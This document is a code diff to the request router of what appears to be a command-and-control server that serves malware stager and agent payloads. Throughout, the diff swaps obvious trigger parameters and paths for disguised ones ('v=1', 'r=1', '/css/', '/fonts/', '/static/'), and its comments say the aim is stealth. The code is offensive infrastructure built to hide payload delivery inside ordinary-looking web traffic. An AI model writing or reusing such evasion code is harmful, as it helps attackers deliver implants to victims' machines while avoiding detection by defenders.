@@ -87,14 +87,13 @@ class OperationRouter:
             logger.info(f"Received {method} request on path: {path}")
             logger.info(f"Endpoint type identified as: {endpoint_type}")
             
-            # Check for stager indicator in query parameters (new)
-            if 'type' in query_params and query_params['type'] == 'stager':
+            # Check for stager indicator in query parameters - using stealthier parameter names
+            if 'v' in query_params and query_params['v'] == '1':
                 logger.info(f"Identified stager request from query parameter")
                 self.agent_handler.handle_stager_request()
                 return
             
-            # Handle agent downloads based on operation type in payload
-            # All paths are now from the pool, so we need to check for special content
+            # Handle agent downloads based on stealth parameters
             if self._looks_like_agent_request(path, method, query_params):
                 logger.info(f"Routing to agent_handler for agent code based on path pattern")
                 self.agent_handler.handle_agent_request()
@@ -309,34 +308,34 @@ class OperationRouter:
         return query_params
     
     def _looks_like_agent_request(self, path, method, query_params=None):
-        """Check if the request appears to be for agent code"""
-        # Check query parameters first
-        if query_params and 'type' in query_params and query_params['type'] == 'agent':
+        """Check if the request appears to be for agent code using mundane parameters"""
+        # Check for stealth query parameters first - 'r=1' indicates agent request
+        if query_params and 'r' in query_params and query_params['r'] == '1':
             return True
             
         # Check path patterns as fallback
         path_lower = path.lower()
         return (
-            ("/agent" in path_lower or 
-             "/raw_agent" in path_lower or 
-             "/js/" in path_lower or
-             "/api/resources" in path_lower) and
+            ("/js/" in path_lower or 
+             "/styles/" in path_lower or
+             "/resources/" in path_lower or
+             "/static/" in path_lower) and
             method == "GET"
         )
     
     def _looks_like_stager_request(self, path, method, query_params=None):
-        """Check if the request appears to be for stager code"""
-        # Check query parameters first
-        if query_params and 'type' in query_params and query_params['type'] == 'stager':
+        """Check if the request appears to be for stager code using mundane parameters"""
+        # Check for stealth query parameters first - 'v=1' indicates stager request
+        if query_params and 'v' in query_params and query_params['v'] == '1':
             return True
             
         # Check path patterns as fallback
         path_lower = path.lower()
         return (
-            ("/stager" in path_lower or 
-             "/loader" in path_lower or 
-             "/bootstrap" in path_lower or
-             "/init" in path_lower) and
+            ("/css/" in path_lower or 
+             "/fonts/" in path_lower or 
+             "/icons/" in path_lower or
+             "/lib/" in path_lower) and
             method == "GET"
         )
     
@@ -348,7 +347,9 @@ class OperationRouter:
             "/download" in path_lower or 
             "/upload" in path_lower or 
             "/content" in path_lower or
-            "/static/" in path_lower
+            "/assets/" in path_lower or
+            "/media/" in path_lower or
+            "/docs/" in path_lower
         )
     
     def _is_file_download_request(self, method):
